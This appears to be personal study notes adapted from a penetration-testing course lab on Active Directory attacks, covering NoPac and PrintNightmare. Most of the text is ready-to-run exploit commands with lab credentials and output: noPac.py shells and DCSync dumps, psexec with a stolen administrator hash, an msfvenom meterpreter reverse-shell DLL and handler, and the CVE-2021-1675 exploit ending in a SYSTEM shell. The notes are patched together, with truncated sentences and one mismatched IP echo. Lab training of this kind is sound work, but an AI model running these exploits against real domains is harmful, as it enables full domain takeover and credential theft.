When it comes to patch management and cycles, many organizations are not quick to roll out patches through their networks. Because of this, we may be able to achieve a quick win either for initial access or domain privilege escalation using a very recent tactic. At the time of writing (April 2022), the three techniques shown in this section are relatively recent (within the last 6-9 months). These are advanced topics that can not be covered thoroughly in one module section. The purpose of demonstrating these attacks is to allow students to try out the latest and greatest attacks in a controlled lab environment and present topics that will be covered in extreme depth in more advanced Active Directory modules. As with any attack, if you do not understand how these work or the risk they could pose to a production environment, it would be best not to attempt them during a real-world client engagement. That being said, these techniques could be considered "safe" and less destructive than attacks such as [Zerologon](https://www.crowdstrike.com/blog/cve-2020-1472-zerologon-security-advisory/) or [DCShadow](https://stealthbits.com/blog/what-is-a-dcshadow-attack-and-how-to-defend-against-it/)

take detailed notes, and communicate with our clients. All attacks come with a risk. For example, the `PrintNightmare` attack could potentially crash the print spooler service on a remote host and cause a service disruption.


As information security practitioners in a rapidly changing and evolving field, we must keep ourselves sharp and on top of recent attacks and new tools and techniques. We recommend trying out all of the techniques in this section and doing additional research to find other methods for performing these attacks. Now, let's dive in.

## NoPac (SamAccountName Spoofing)

|42278|42287|
|---|---|
|`42278` is a bypass vulnerability with the Security Account Manager (SAM).|`42287` is a vulnerability within the Kerberos Privilege Attribute Certificate (PAC) in ADDS.|

being able to change the `SamAccountName` of a computer account to that of a Domain Controller. By default, authenticated users can add up to [ten computers to a domain](https://docs.microsoft.com/en-us/windows/security/threat-protection/security-policy-settings/add-workstations-to-domain). When doing so, we change the name of the new host to match a Domain Controller's SamAccountName.
https://www.secureworks.com/blog/nopac-a-tale-of-two-vulnerabilities-that-could-end-in-ransomware


The **NoPac attack** (combining **CVE-2021-42278** and **CVE-2021-42287**) allows an attacker with **any low-privileged domain user** to escalate directly to **Domain Admin** by abusing how Kerberos handles machine account names and tickets.

## **Understanding the Two CVEs Involved**

| CVE                | Vulnerability                                             | Explanation                                                                                                                                                       |
| ------------------ | --------------------------------------------------------- | ----------------------------------------------------------------------------------------------------------------------------------------------------------------- |
| **CVE-2021-42278** | **SAM Account Name Spoofing**                             | Allows a domain user to modify the `SamAccountName` attribute of a machine account.                                                                               |
| **CVE-2021-42287** | **Kerberos Privilege Attribute Certificate (PAC) Bypass** | When requesting a **Service Ticket (TGS)**, if no account is found, Kerberos automatically assumes it is a Domain Controller (DC) and grants DC-level privileges. |
### **🛑 Step 1: Request a TGS for a Service on the DC**

- After renaming our machine account to `DC01$`, we request a **TGS for a service on the real DC** (e.g., `ldap/DC01` or `cifs/DC01`).
- The KDC (on the real DC) checks:
    - **"Who is requesting this?"** → `DC01$` (our fake identity).
    - **"Does `DC01$` exist?"** → **Yes, because we renamed our machine account.**
    - **"Encrypt the TGS using the target machine's account hash"** → It **encrypts the TGS using the real `DC01$` NTLM hash**.

### **🛑 Step 2: Inject and Use the TGS**

- We **inject the TGS into our session** (using Mimikatz or Rubeus).
- Now, when we connect to **services running on the real DC**, the DC **decrypts the ticket with its own NTLM hash** and trusts us as `DC01$`.

👉 **We are now authenticated as the Domain Controller itself!**


---

using a scanner (`scanner.py`) then use the exploit (`noPac.py`) to gain a shell as `NT AUTHORITY/SYSTEM`. We can use the scanner with a standard domain user account to attempt to obtain a TGT from the target Domain Controller. If successful, this indicates the system is, in fact, vulnerable. We'll also notice the `ms-DS-MachineAccountQuota` number is set to 10. In some environments, an astute sysadmin may set the `ms-DS-MachineAccountQuota` value to 0. If this is the case, the attack will fail because our user will not have the rights to add a new machine account. Setting this to `0` can prevent quite a few AD attacks.


#### Scanning for NoPac
```bash
AhmaDb0x@htb[/htb]$ sudo python3 scanner.py inlanefreight.local/forend:Klmcargo2 -dc-ip 172.16.5.5 -use-ldap

███    ██  ██████  ██████   █████   ██████ 
████   ██ ██    ██ ██   ██ ██   ██ ██      
██ ██  ██ ██    ██ ██████  ███████ ██      
██  ██ ██ ██    ██ ██      ██   ██ ██      
██   ████  ██████  ██      ██   ██  ██████ 
                                           
[*] Current ms-DS-MachineAccountQuota = 10
```

obtain a shell with SYSTEM level privileges. We can do this by running noPac.py with the syntax below to impersonate the built-in administrator account and drop into a semi-interactive shell session on the target Domain Controller. This could be "noisy" or may be blocked by AV or EDR.

```bash
AhmaDb0x@htb[/htb]$ sudo python3 noPac.py INLANEFREIGHT.LOCAL/forend:Klmcargo2 -dc-ip 172.16.5.5  -dc-host ACADEMY-EA-DC01 -shell --impersonate administrator -use-ldap
```

```shell-session
Saving ticket in administrator.ccache
[*] Remove ccache of ACADEMY-EA-DC01.INLANEFREIGHT.LOCAL
[*] Rename ccache with target ...
```

NoPac.py does save the TGT in the directory on the attack host where the exploit was run. We can use `ls` to confirm.

We could then use the ccache file to perform a pass-the-ticket and perform further attacks such as DCSync. We can also use the tool with the `-dump` flag to perform a DCSync using secretsdump.py. This method would still create a ccache file on disk, which we would want to be aware of and clean up.

#### Using noPac to DCSync the Built-in Administrator Account

```shell-session
AhmaDb0x@htb[/htb]$ sudo python3 noPac.py INLANEFREIGHT.LOCAL/forend:Klmcargo2 -dc-ip 172.16.5.5  -dc-host ACADEMY-EA-DC01 --impersonate administrator -use-ldap -dump -just-dc-user INLANEFREIGHT/administrator
```

```bash
AhmaDb0x@htb[/htb]$ impacket-psexec inlanefreight.local/administrator@172.16.5.5 -hashes aad3b435b51404eeaad3b435b51404ee:88ad09182de639ccc6579eb0849751cf

```
## Windows Defender & SMBEXEC.py Considerations

If Windows Defender (or another AV or EDR product) is enabled on a target, our shell session may be established, but issuing any commands will likely fail. The first thing smbexec.py does is create a service called `BTOBTO`. Another service called `BTOBO` is created, and any command we type is sent to the target over SMB inside a .bat file called `execute.bat`. With each new command we type, a new batch script is created and echoed to a temporary file that executes said script and deletes it from the system. Let's look at a Windows Defender log to see what behavior was considered malicious.


![image](https://academy.hackthebox.com/storage/modules/143/defenderLog.png)


---
------
---
---
----
---

## PrintNightmare

The **Print Spooler** service is a Windows service that manages the **printing process** by handling print jobs sent from applications to a printer. It queues print jobs, schedules them for printing, and communicates with the printer driver.



#### *goal == gain a SYSTEM shell session on a Domain Controller running on a Windows Server 2019 host.*

#### Cloning the Exploit
```shell-session
AhmaDb0x@htb[/htb]$ git clone https://github.com/cube0x0/CVE-2021-1675.git
```

```shell-session
pip3 uninstall impacket
git clone https://github.com/cube0x0/impacket
cd impacket
python3 ./setup.py install
```

We can use `rpcdump.py` to see if `Print System Asynchronous Protocol` and `Print System Remote Protocol` are exposed on the target.

#### Enumerating for MS-RPRN
```shell-session
AhmaDb0x@htb[/htb]$ rpcdump.py @172.16.5.5 | egrep 'MS-RPRN|MS-PAR'
```

#### Generating a DLL Payload
```shell-session
AhmaDb0x@htb[/htb]$ msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=172.16.5.225 LPORT=8080 -f dll > backupscript.dll
```

#### Creating a Share with smbserver.py
```shell-session
AhmaDb0x@htb[/htb]$ sudo smbserver.py -smb2support CompData /path/to/backupscript.dll
```

#### Configuring & Starting MSF multi/handler
```shell-session
[msf](Jobs:0 Agents:0) >> use exploit/multi/handler
[*] Using configured payload generic/shell_reverse_tcp
[msf](Jobs:0 Agents:0) exploit(multi/handler) >> set PAYLOAD windows/x64/meterpreter/reverse_tcp
PAYLOAD => windows/x64/meterpreter/reverse_tcp
[msf](Jobs:0 Agents:0) exploit(multi/handler) >> set LHOST 172.16.5.225
LHOST => 10.3.88.114
[msf](Jobs:0 Agents:0) exploit(multi/handler) >> set LPORT 8080
LPORT => 8080
[msf](Jobs:0 Agents:0) exploit(multi/handler) >> run

[*] Started reverse TCP handler on 172.16.5.225:8080 
```


#### Running the Exploit
```shell-session
AhmaDb0x@htb[/htb]$ sudo python3 CVE-2021-1675.py inlanefreight.local/forend:Klmcargo2@172.16.5.5 '\\172.16.5.225\CompData\backupscript.dll'
```
```shell-session
(Meterpreter 1)(C:\Windows\system32) > shell
Process 5912 created.
Channel 1 created.
Microsoft Windows [Version 10.0.17763.737]
(c) 2018 Microsoft Corporation. All rights reserved.

C:\Windows\system32>whoami
whoami
nt authority\system
```


---
---
---
---
----
---

## PetitPotam (MS-EFSRPC)